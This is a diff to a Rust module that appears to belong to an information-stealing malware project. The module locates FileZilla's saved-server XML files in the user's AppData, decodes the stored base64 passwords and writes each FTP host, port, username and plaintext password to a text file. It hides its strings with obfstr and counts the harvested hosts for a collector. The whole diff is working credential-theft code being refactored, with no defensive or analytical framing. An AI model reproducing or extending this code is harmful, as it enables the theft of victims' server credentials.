@@ -1,21 +1,24 @@
 use alloc::borrow::ToOwned;
+use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
-use alloc::format;
+use collector::{Collector, Software};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, WriteTo};
+use obfstr::obfstr as s;
 use tasks::Task;
-use utils::path::{Path, WriteToFile};
+use utils::base64::base64_decode;
 use windows::core::HSTRING;
 use windows::Data::Xml::Dom::XmlDocument;
-use utils::base64::base64_decode;
-use obfstr::obfstr as s;
 
 pub(super) struct FileZillaTask;
 
-impl Task for FileZillaTask {
-    unsafe fn run(&self, parent: &Path) {
+impl<C: Collector, F: FileSystem> Task<C, F> for FileZillaTask {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let servers = collect_servers();
 
-        if servers.len() == 0 {
+        if servers.is_empty() {
             return;
         }
 
@@ -27,26 +30,30 @@ impl Task for FileZillaTask {
             }
         }
 
-        let servers = deduped.iter().map(|server| {
-            let password_decoded = base64_decode(server.password.as_bytes())
-                .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
+        let servers: Vec<String> = deduped
+            .iter()
+            .map(|server| {
+                let password_decoded = base64_decode(server.password.as_bytes())
+                    .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
 
-            let password_str = match password_decoded {
-                Some(ref s) => s.as_str(),
-                None => &server.password,
-            };
+                let password_str = match password_decoded {
+                    Some(ref s) => s.as_str(),
+                    None => &server.password,
+                };
 
-            format!(
-                "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
-                server.host,
-                server.port,
-                server.user,
-                password_str
-            )
-        }).collect::<Vec<_>>().join("\n\n");
+                format!(
+                    "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
+                    server.host, server.port, server.user, password_str
+                )
+            })
+            .collect();
 
-        let output = parent / s!("FileZilla.txt");
-        let _ = servers.write_to(&output);
+        collector
+            .get_software()
+            .increase_ftp_hosts_by(servers.len());
+
+        let servers = servers.join("\n\n");
+        let _ = servers.write_to(filesystem, parent / s!("FileZilla.txt"));
     }
 }
 
@@ -55,12 +62,15 @@ fn collect_servers() -> Vec<Server> {
     let base = &Path::appdata() / s!("FileZilla");
 
     let paths = [
-        (&base / s!("recentservers.xml"), s!("RecentServers").to_owned()),
+        (
+            &base / s!("recentservers.xml"),
+            s!("RecentServers").to_owned(),
+        ),
         (&base / s!("sitemanager.xml"), s!("Servers").to_owned()),
     ];
 
     for (path, servers_node) in paths {
-        if let Some(servers) = collect_servers_from_path(&path, servers_node) {
+        if let Some(servers) = collect_servers_from_path(&StorageFileSystem, &path, servers_node) {
             result.extend(servers)
         }
     }
@@ -68,17 +78,23 @@ fn collect_servers() -> Vec<Server> {
     result
 }
 
-fn collect_servers_from_path<S>(path: &Path, servers_node: S) -> Option<Vec<Server>>
+fn collect_servers_from_path<F, S>(
+    filesystem: &F,
+    path: &Path,
+    servers_node: S,
+) -> Option<Vec<Server>>
 where
     S: AsRef<str>,
+    F: FileSystem,
 {
     let mut result: Vec<Server> = Vec::new();
 
-    if !path.is_exists() {
+    if !filesystem.is_exists(path) {
         return None;
     }
 
-    let bytes = path.read_file();
+    let bytes = filesystem.read_file(path);
+
     if bytes.is_err() {
         return None;
     }
@@ -91,7 +107,9 @@ where
     xml_doc.LoadXml(&content).ok()?;
 
     let root = xml_doc.DocumentElement().ok()?;
-    let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;
+    let servers = root
+        .SelectSingleNode(&HSTRING::from(servers_node.as_ref()))
+        .ok()?;
 
     let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;
 
@@ -115,7 +133,7 @@ where
             host,
             port,
             user,
-            password
+            password,
         })
     }
 
@@ -127,5 +145,5 @@ struct Server {
     host: String,
     port: u16,
     user: String,
-    password: String
+    password: String,
 }
